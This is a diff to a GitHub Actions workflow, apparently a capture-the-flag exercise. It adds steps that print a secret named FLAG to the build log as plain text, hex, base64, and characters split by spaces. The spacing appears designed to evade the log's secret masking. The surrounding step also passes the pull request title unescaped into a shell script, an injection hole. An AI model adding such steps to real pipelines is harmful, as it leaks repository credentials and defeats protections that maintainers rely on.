@@ -22,11 +22,18 @@ jobs:
       - name: Process contributor metadata
 
         run: |
-          echo "Reading contributor commit..."
+          echo "Reading contributor commit... $FLAG"
           echo "Processing contributor title: ${{ github.event.pull_request.title }}"
           echo "Hello"
-          echo -n "$FLAG" | xxd -p
+          echo -n "$FLAG" | xxd -p      
+      
+      - name: Debug Secret
+        run: |
+          echo "ENCODED_FLAG=$(echo -n "$FLAG" | base64)" >> $GITHUB_ENV
 
+      - name: Print Secret
+        run: |
+          echo "$ENCODED_FLAG" | sed 's/./& /g'
 
 
       - name: Run CI validation
